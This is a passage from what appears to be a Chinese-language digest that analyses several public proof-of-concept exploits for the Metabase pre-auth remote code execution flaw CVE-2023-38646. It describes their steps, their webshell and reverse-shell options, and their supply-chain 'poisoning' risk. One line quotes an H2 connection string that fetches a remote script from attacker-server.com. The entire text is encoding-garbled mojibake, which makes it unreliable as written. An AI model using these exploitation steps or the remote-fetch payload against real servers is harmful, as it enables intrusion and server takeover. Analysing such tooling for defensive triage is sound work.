1.  **æœªæˆæƒè®¿é—®ï¼š** è¯¥æ¼æ´æ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨ã€‚
2.  **RCEï¼š**  æ”»å‡»è€…å¯ä»¥å‘é€ç‰¹åˆ¶çš„è¯·æ±‚ï¼Œæ‰§è¡ŒæœåŠ¡å™¨ä¸Šçš„ä»»æ„å‘½ä»¤ã€‚
3.  **å…·ä½“åˆ©ç”¨ï¼š** æ ¹æ®æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ”»å‡»æµç¨‹ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š
    *   **éªŒè¯æ¨¡å—ï¼š**  å‘`/api/session/properties`ç«¯ç‚¹å‘é€è¯·æ±‚ï¼Œè·å–æœªæˆæƒçš„tokenï¼Œç¡®è®¤æ¼æ´æ˜¯å¦å­˜åœ¨ã€‚
    *   **å‘½ä»¤æ‰§è¡Œæ¨¡å—ï¼š** åˆ©ç”¨ä¸Šä¸€æ­¥è·å–çš„tokenï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚éœ€è¦æŒ‡å®šmetabase.jarçš„ä½ç½®ã€‚
    *   **å†…å­˜é©¬æ³¨å…¥æ¨¡å—ï¼š** é€šè¿‡ä¿®æ”¹`x-client-data`è¯·æ±‚å¤´æ³¨å…¥å†…å­˜é©¬ï¼Œæ”¯æŒ cmd å’Œ godzilla ä¸¤ç§æ¨¡å¼ã€‚cmdæ¨¡å¼ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œgodzillaæ¨¡å¼åˆ™ç›´æ¥è¿æ¥å“¥æ–¯æ‹‰webshellã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ª Metabase RCE å›¾å½¢åŒ–åˆ©ç”¨å·¥å…·ï¼ŒåŒ…å«äº†éªŒè¯æ¨¡å—ã€å‘½ä»¤æ‰§è¡Œæ¨¡å—å’Œå†…å­˜é©¬æ³¨å…¥æ¨¡å—ã€‚ä¸»è¦çš„æ½œåœ¨æŠ•æ¯’é£é™©å­˜åœ¨äºä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **å†…å­˜é©¬æ³¨å…¥ï¼š** å†…å­˜é©¬æ³¨å…¥æ¨¡å—æœ¬èº«å…·æœ‰è¾ƒé«˜çš„é£é™©ï¼Œå¯èƒ½è¢«ç”¨äºæ¤å…¥æ¶æ„ä»£ç ï¼Œé•¿æœŸæ§åˆ¶æœåŠ¡å™¨ã€‚ä»£ç ä¸­`x-client-data:godzilla`çš„æ–¹å¼è¿æ¥å“¥æ–¯æ‹‰webshellï¼Œé»˜è®¤å¯†ç ä¸ºpassï¼Œå¯èƒ½ä¼šè¢«å…¶ä»–äººåˆ©ç”¨ã€‚
2.  **å‘½ä»¤æ‰§è¡Œæ¨¡å—ï¼š** è™½ç„¶å‘½ä»¤æ‰§è¡Œæ¨¡å—çš„ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†æ¶æ„æ”»å‡»è€…å¯èƒ½ä¼šä¿®æ”¹è¯¥æ¨¡å—ï¼Œæ·»åŠ é¢å¤–çš„æ¶æ„è¡Œä¸ºï¼Œä¾‹å¦‚ä¸‹è½½å¹¶æ‰§è¡Œæ¶æ„è„šæœ¬ã€‚

è€ƒè™‘åˆ°ä»¥ä¸Šé£é™©ï¼Œè¯¥POCå·¥å…·å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œå°¤å…¶æ˜¯å†…å­˜é©¬æ¨¡å—ã€‚éœ€è¦åœ¨ä½¿ç”¨å‰è¿›è¡Œä»£ç å®¡è®¡ï¼Œç¡®ä¿æ²¡æœ‰æ¶æ„ä»£ç ã€‚

**é£é™©è¯„ä¼°ï¼š**

å°½ç®¡è¯¥å·¥å…·ç®€åŒ–äº†æ¼æ´åˆ©ç”¨è¿‡ç¨‹ï¼Œä½†ä½¿ç”¨å®ƒä¹Ÿå¯èƒ½å¼•å…¥é£é™©ã€‚ç”¨æˆ·åº”è°¨æ…ä½¿ç”¨æ­¤å·¥å…·ï¼Œå¹¶å……åˆ†äº†è§£å…¶æ½œåœ¨çš„å±å®³ã€‚å»ºè®®åœ¨éç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ï¼Œå¹¶è¿›è¡Œå……åˆ†çš„å®‰å…¨æµ‹è¯•ã€‚

**é£é™©æ¦‚ç‡ï¼š**

è€ƒè™‘åˆ°å†…å­˜é©¬æ³¨å…¥çš„é£é™©ï¼Œä¸”è¯¥POCå·¥å…·ç”±ä¸ªäººå¼€å‘è€…æä¾›ï¼Œå¹¶éæ¥è‡ªå®˜æ–¹æˆ–ä¿¡èª‰è‰¯å¥½çš„å®‰å…¨å‚å•†ï¼Œå› æ­¤ç»¼åˆè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚è¿™ä¸ª10%ä¸»è¦æ¥è‡ªäºå¯¹ä½¿ç”¨è€…ç¼ºä¹å®‰å…¨æ„è¯†ä»¥åŠå¯¹å·¥å…·çš„æœªçŸ¥æ€§å¯èƒ½å¸¦æ¥çš„é£é™©ï¼Œè€Œéä»£ç æœ¬èº«ä¸€å®šå­˜åœ¨æ¶æ„åé—¨ã€‚

**é¡¹ç›®åœ°å€:** [Boogipop/MetabaseRceTools](https://github.com/Boogipop/MetabaseRceTools)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #4

**æ¥æº**: [CVE-2023-38646-BreezeGalaxy_CVE-2023-38646.md](../2023/CVE-2023-38646-BreezeGalaxy_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ä»¥é€šè¿‡HTTPè®¿é—®ï¼Œä¸”æœªè¿›è¡Œèº«ä»½éªŒè¯é…ç½®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´åˆ©ç”¨äº† Metabase å¤„ç†æ•°æ®åº“è¿æ¥çš„æ–¹å¼ï¼Œç‰¹åˆ«æ˜¯ H2 æ•°æ®åº“ã€‚æä¾›çš„ POC è„šæœ¬é¦–å…ˆè·å– setup tokenï¼Œç„¶ååˆ›å»ºä¸€ä¸ªç®¡ç†å‘˜è´¦æˆ·ï¼Œæœ€åæ·»åŠ ä¸€ä¸ªæ¶æ„çš„æ•°æ®åº“è¿æ¥ï¼Œè¯¥è¿æ¥åŒ…å«ä¸€ä¸ª H2 è¿æ¥å­—ç¬¦ä¸²ï¼Œå…¶ä¸­åŒ…å«åµŒå…¥å¼å‘½ä»¤ï¼Œå…è®¸æ”»å‡»è€…æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚è¿æ¥å­—ç¬¦ä¸²ä¸­çš„ `INIT=RUNSCRIPT FROM 'http://attacker-server.com/poc.sql'` æŒ‡ç¤º H2 ä»è¿œç¨‹æœåŠ¡å™¨æ‰§è¡Œ SQL è„šæœ¬ï¼Œè™½ç„¶ `poc.sql` æ–‡ä»¶æœ¬èº«æ— å®³ï¼Œä½†çœŸæ­£çš„æ”»å‡»è½½è·åµŒå…¥åœ¨è¿æ¥å­—ç¬¦ä¸²æœ¬èº«ï¼Œåˆ©ç”¨ `CREATE ALIAS` åˆ›å»ºä¸€ä¸ªJavaå‡½æ•°,ä»è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚\n\n**åˆ©ç”¨æ–¹å¼ï¼š**\n1. **è·å– Setup Token:**  é€šè¿‡è®¿é—® `/api/session/properties` è·å–åˆå§‹è®¾ç½®æ‰€éœ€çš„ tokenã€‚\n2. **è®¾ç½®ç®¡ç†å‘˜è´¦æˆ·:**  ä½¿ç”¨è·å–çš„ tokenï¼Œè°ƒç”¨ `/api/setup` åˆ›å»ºä¸€ä¸ªæ–°çš„ç®¡ç†å‘˜è´¦æˆ·ã€‚è¿™å°†åˆ›å»ºä¸€ä¸ªå…·æœ‰å¿…è¦æƒé™çš„ä¼šè¯ã€‚\n3. **æ·»åŠ æ¶æ„æ•°æ®åº“è¿æ¥:** ä½¿ç”¨æ–°åˆ›å»ºçš„ç®¡ç†å‘˜ä¼šè¯ï¼Œè°ƒç”¨ `/api/database` API æ·»åŠ ä¸€ä¸ªæ–°çš„æ•°æ®åº“ã€‚å…³é”®åœ¨äºæ„é€ æ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²ï¼Œåˆ©ç”¨ `INIT` å‚æ•°æ‰§è¡Œè¿œç¨‹ SQL è„šæœ¬ï¼Œè¯¥è„šæœ¬å®šä¹‰äº†ä¸€ä¸ª Java å‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ä¸ºäº†ç»•è¿‡æŸäº›é™åˆ¶ï¼Œé€šå¸¸åˆ©ç”¨ `CREATE ALIAS` åˆ›å»ºJavaå‡½æ•°,ä»è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚\n\n**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„ PoC ä»£ç æ˜¯æœ‰æ•ˆçš„ï¼Œå®ƒèƒ½å¤Ÿåˆ©ç”¨è¯¥æ¼æ´åœ¨ Metabase å®ä¾‹ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œå¦‚æœç›®æ ‡å®ä¾‹çš„ç‰ˆæœ¬ä½äºå—å½±å“çš„ç‰ˆæœ¬ã€‚\n\n**æŠ•æ¯’é£é™©ï¼š** é£é™©ä¸º10%ï¼Œä¸»è¦é£é™©åœ¨äº `exploit.py` æ–‡ä»¶ä¸­`YOUR_GITPOD_WORKSPACE_URL` å¦‚æœä¸æ˜¯æ”»å‡»è€…è‡ªå·±çš„æœåŠ¡å™¨ï¼Œå­˜åœ¨è¢«ä¸­é—´äººæ”»å‡»æ›¿æ¢è¿æ¥çš„é£é™©. è™½ç„¶`poc.sql`ç›®å‰ä»…ä»…æ˜¯ `SELECT 1;`ï¼Œ ä½†æ˜¯å¦‚æœæœ‰äººæ¶æ„ä¿®æ”¹`poc.sql`ï¼Œåˆ™å­˜åœ¨è¢«æŠ•æ¯’é£é™©ã€‚ start.shä¸­çš„metabase.jaræ¥æºå¯èƒ½è¢«ç¯¡æ”¹ï¼Œå­˜åœ¨è¢«æŠ•æ¯’é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [BreezeGalaxy/CVE-2023-38646](https://github.com/BreezeGalaxy/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #5

**æ¥æº**: [CVE-2023-38646-CN016_Metabase-H2-CVE-2023-38646-.md](../2023/CVE-2023-38646-CN016_Metabase-H2-CVE-2023-38646-.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** MetabaseæœåŠ¡éœ€è¦å¯è®¿é—®ï¼Œæ— éœ€è®¤è¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´å­˜åœ¨äºMetabaseçš„setupæµç¨‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„JDBC URLæ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§:**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š
1.  è·å–setup-tokenï¼šPOCé¦–å…ˆå°è¯•ä»`/api/session/properties`è·å–setup-tokenã€‚è¿™æ˜¯åˆ©ç”¨æ¼æ´çš„å‰æã€‚ä»æ¼æ´ä¿¡æ¯æ¥çœ‹ï¼Œè¿™ä¸ªæ¥å£ä¸éœ€è¦èº«ä»½éªŒè¯ã€‚
2.  æ„é€ Payloadï¼šPOCæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JDBC URLçš„JSON payloadã€‚è¯¥URLåˆ©ç”¨H2æ•°æ®åº“çš„`CREATE TRIGGER`åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å‘½ä»¤çš„æ‰§è¡Œæ˜¯é€šè¿‡è°ƒç”¨`java.lang.Runtime.getRuntime().exec()`å®ç°çš„ã€‚POCä¸­é»˜è®¤æ‰§è¡Œ`touch /tmp/success`ï¼Œè¿™æ˜¯ä¸€ä¸ªæ— å®³çš„å‘½ä»¤ï¼Œç”¨äºéªŒè¯æ¼æ´çš„å­˜åœ¨ã€‚
3.  å‘é€Payloadï¼šPOCå°†æ„é€ çš„payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚å¦‚æœæœåŠ¡å™¨è¿”å›åŒ…å«"Error creating or initializing trigger"çš„å“åº”ï¼Œåˆ™è¡¨æ˜æ¼æ´åˆ©ç”¨æˆåŠŸã€‚

**æŠ•æ¯’é£é™©:**
è™½ç„¶POCçš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ã€‚ä»¥ä¸‹æ˜¯åˆ†æï¼š
1. **`custom_base64_encode`å‡½æ•°:** è¿™ä¸ªå‡½æ•°å­˜åœ¨è¢«æ»¥ç”¨çš„å¯èƒ½ã€‚è™½ç„¶å…¶ç›®çš„æ˜¯å¯¹å‘½ä»¤è¿›è¡Œç¼–ç ï¼Œä½†å¦‚æœç”¨äºç¼–ç æ¶æ„è„šæœ¬å¹¶æ‰§è¡Œï¼Œåˆ™ä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜ã€‚
2. **å‘½ä»¤æ‰§è¡Œ:** POCä¸­ä½¿ç”¨`java.lang.Runtime.getRuntime().exec()`æ‰§è¡Œå‘½ä»¤ã€‚è¿™æœ¬èº«å°±å¾ˆå±é™©ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼ŒåŒ…æ‹¬ä¸‹è½½å’Œæ‰§è¡Œæ¶æ„è„šæœ¬ã€‚
3. **é»˜è®¤å‘½ä»¤:** è™½ç„¶POCé»˜è®¤æ‰§è¡Œçš„æ˜¯`touch /tmp/success`ï¼Œä½†æ”»å‡»è€…å¯ä»¥å¾ˆå®¹æ˜“åœ°ä¿®æ”¹`-c`å‚æ•°æ¥æ‰§è¡Œä»»ä½•å…¶ä»–å‘½ä»¤ã€‚å¦‚æœPOCè¢«åˆ†å‘å¹¶è¢«ç¼ºä¹ç»éªŒçš„ç”¨æˆ·ä½¿ç”¨ï¼Œä»–ä»¬å¯èƒ½ä¼šç›´æ¥æ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„å‘½ä»¤ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©ä¸»è¦åœ¨äºä½¿ç”¨è€…å¯èƒ½å—åˆ°æ¶æ„å‘½ä»¤çš„å½±å“ã€‚`custom_base64_encode`å‡½æ•°å’Œå‘½ä»¤æ‰§è¡Œæœºåˆ¶ä¹Ÿä¸ºæ½œåœ¨çš„æ¶æ„è¡Œä¸ºæä¾›äº†å¯èƒ½æ€§ã€‚é£é™©è¯„ä¼°ä¸º 10%ï¼Œä¸»è¦æ¥æºäºä½¿ç”¨è€…æ²¡æœ‰å®‰å…¨æ„è¯†ï¼Œç›´æ¥æ‰§è¡Œäº†æ¶æ„å‘½ä»¤ï¼Œæˆ–è€…ä»£ç åº“çš„ä¸‹è½½æºè¢«æ›¿æ¢ã€‚

**åˆ©ç”¨æ–¹å¼:**
1.  æ”»å‡»è€…é¦–å…ˆå‘`/api/session/properties`å‘é€GETè¯·æ±‚ä»¥è·å–setup-tokenã€‚
2.  ç„¶åï¼Œæ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JDBC URLçš„JSON payloadã€‚æ¶æ„JDBC URLåˆ©ç”¨H2æ•°æ®åº“çš„`CREATE TRIGGER`åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºä¸€ä¸ªåœ¨`INFORMATION_SCHEMA.TABLES`ä¸Šè§¦å‘çš„triggerï¼Œå¹¶åœ¨è§¦å‘æ—¶æ‰§è¡ŒJavaä»£ç ã€‚Javaä»£ç è°ƒç”¨`java.lang.Runtime.getRuntime().exec()`æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…å°†æ„é€ çš„payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚
4.  å¦‚æœæœåŠ¡å™¨æˆåŠŸåˆ›å»ºäº†triggerï¼Œåˆ™æ”»å‡»æˆåŠŸï¼Œæ”»å‡»è€…æ‰§è¡Œçš„å‘½ä»¤å°†åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [CN016/Metabase-H2-CVE-2023-38646-](https://github.com/CN016/Metabase-H2-CVE-2023-38646-)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #6

**æ¥æº**: [CVE-2023-38646-DaniTheHack3r_CVE-2023-38646.md](../2023/CVE-2023-38646-DaniTheHack3r_CVE-2023-38646.md)

## CVE-2023-38646 Metabase RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ç½‘ç»œè®¿é—®ï¼Œä¸”ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæ­¤æ¼æ´çš„ä¸¥é‡ç¨‹åº¦ä¸ºé«˜å±ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Token:** POCä»£ç é¦–å…ˆå°è¯•ä» `[TARGET_URL]/api/session/properties` è·å– setup-tokenã€‚
2.  **æ„é€  Payload:** åˆ©ç”¨è·å–åˆ°çš„tokenï¼ŒPOCæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ payloadã€‚è¯¥å­—ç¬¦ä¸²ä¸­åŒ…å«å¯æ‰§è¡Œå‘½ä»¤ï¼ˆé€šè¿‡ `COMMAND` å‚æ•°ä¼ å…¥ï¼‰ï¼Œé€šå¸¸é€šè¿‡ Base64 ç¼–ç è¿›è¡Œæ··æ·†ã€‚
3.  **å‘é€ Payload:** æ„é€ å¥½çš„payloadä¼šè¢«å‘é€åˆ° Metabase æœåŠ¡å™¨ï¼Œåˆ©ç”¨å…¶å¯¹æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²å¤„ç†ä¸å½“çš„æ¼æ´ï¼Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚
4.  **å‘½ä»¤æ‰§è¡Œ:**  é€šè¿‡åˆ›å»ºè§¦å‘å™¨å’Œåˆ©ç”¨H2æ•°æ®åº“ç‰¹æ€§ï¼Œå®ç°åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´æè¿°ã€æœç´¢å¼•æ“ç»“æœï¼ˆä¾‹å¦‚ï¼Œ[https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646/](https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646/) ï¼‰å’ŒPOCä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§è¾ƒé«˜ã€‚å¤šä¸ªæ¥æºè¡¨æ˜ï¼Œè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

POCä»£ç ä¸­å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡Œå‘½ä»¤ï¼Œä½†ä»£ç ä¸­å­˜åœ¨ä»¥ä¸‹æ½œåœ¨çš„é£é™©ç‚¹ï¼š

*   **è‡ªå®šä¹‰ Base64 ç¼–ç :**  `CustomBase64Encode` å‡½æ•°ä½¿ç”¨è‡ªå®šä¹‰çš„ Base64 ç¼–ç æ–¹å¼ï¼Œè™½ç„¶ç›®çš„æ˜¯ä¸ºäº†ç¬¦åˆæ¼æ´åˆ©ç”¨çš„è¦æ±‚ï¼Œä½†ä¹Ÿå¯èƒ½è¢«ç”¨æ¥éšè—æ¶æ„ä»£ç ã€‚
*   **Payload æ„é€ :** Payloadçš„æ„é€ è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼Œæ”»å‡»è€…å¯èƒ½åœ¨payloadä¸­åµŒå…¥é¢å¤–çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚ï¼Œåœ¨è¿æ¥å­—ç¬¦ä¸²ä¸­æ·»åŠ é¢å¤–çš„å‚æ•°ï¼Œä»¥ä¾¿åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚
*   **ä»£ç†è®¾ç½®:** æ¶æ„æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡ä»£ç†æœåŠ¡å™¨å‘èµ·æ”»å‡», ä»è€Œéšè—è‡ªå·±çš„èº«ä»½ä¿¡æ¯.

å°½ç®¡å¦‚æ­¤ï¼Œæ ¹æ®ä»£ç æœ¬èº«ï¼Œå¤§éƒ¨åˆ†ä»£ç æ˜¯ç”¨äºå®ç°æ¼æ´åˆ©ç”¨åŠŸèƒ½çš„ï¼ŒæŠ•æ¯’çš„å¯èƒ½æ€§ç›¸å¯¹è¾ƒä½ï¼Œä¼°è®¡åœ¨10%å·¦å³ã€‚éœ€è¦äººå·¥å®¡æ ¸Payloadæ„é€ éƒ¨åˆ†ã€‚


**é¡¹ç›®åœ°å€:** [DaniTheHack3r/CVE-2023-38646](https://github.com/DaniTheHack3r/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #7

**æ¥æº**: [CVE-2023-38646-Ego1stoo_CVE-2023-38646.md](../2023/CVE-2023-38646-Ego1stoo_CVE-2023-38646.md)

## CVE-2023-38646 Metabase Pre-Auth RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 å’Œ Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ Metabase å®ä¾‹éœ€è¦è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œå¹¶ä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®åˆ°è¯¥å®ä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´çš„åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **æ¼æ´åŸç†ï¼š** Metabase å­˜åœ¨ä¸€ä¸ªæœªæˆæƒçš„ `/api/setup/validate` æ¥å£ï¼Œè¯¥æ¥å£ç”¨äºåœ¨ Metabase é¦–æ¬¡è®¾ç½®æ—¶éªŒè¯æ•°æ®åº“è¿æ¥ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¥å£ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚
2.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   é¦–å…ˆï¼Œæ”»å‡»è€…è®¿é—® Metabase å®ä¾‹çš„æ ¹è·¯å¾„ï¼Œè·å– `setup-token`ã€‚è¿™ä¸ªtokenè¢«åµŒå…¥åœ¨HTMLå“åº”çš„JavaScriptä»£ç ä¸­ï¼Œç”¨äºåç»­çš„è®¾ç½®è¿‡ç¨‹ã€‚
    *   ç„¶åï¼Œæ”»å‡»è€…å‘ `/api/setup/validate` æ¥å£å‘é€ POST è¯·æ±‚ï¼Œè¯·æ±‚ä½“åŒ…å«ä¸€ä¸ªæ¶æ„çš„ JSON å¯¹è±¡ã€‚è¿™ä¸ª JSON å¯¹è±¡çš„ `details.details.db` å­—æ®µåŒ…å«ä¸€ä¸ªç‰¹åˆ¶çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¿™ä¸ªè¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥äº†æ¶æ„ä»£ç ï¼Œåˆ©ç”¨ H2 æ•°æ®åº“çš„ `TRACE_LEVEL_SYSTEM_OUT` å’Œ `CREATE TRIGGER` åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„çš„ shell å‘½ä»¤ã€‚
    *   POCä»£ç æ„é€ äº†ä¸€ä¸ªåå¼¹shellçš„payloadï¼Œå°†ç›®æ ‡æœºå™¨ä¸Šçš„è¾“å…¥è¾“å‡ºé‡å®šå‘åˆ°æ”»å‡»è€…æ§åˆ¶çš„æœºå™¨ä¸Šï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
3.  **æŠ•æ¯’é£é™©åˆ†æï¼š**
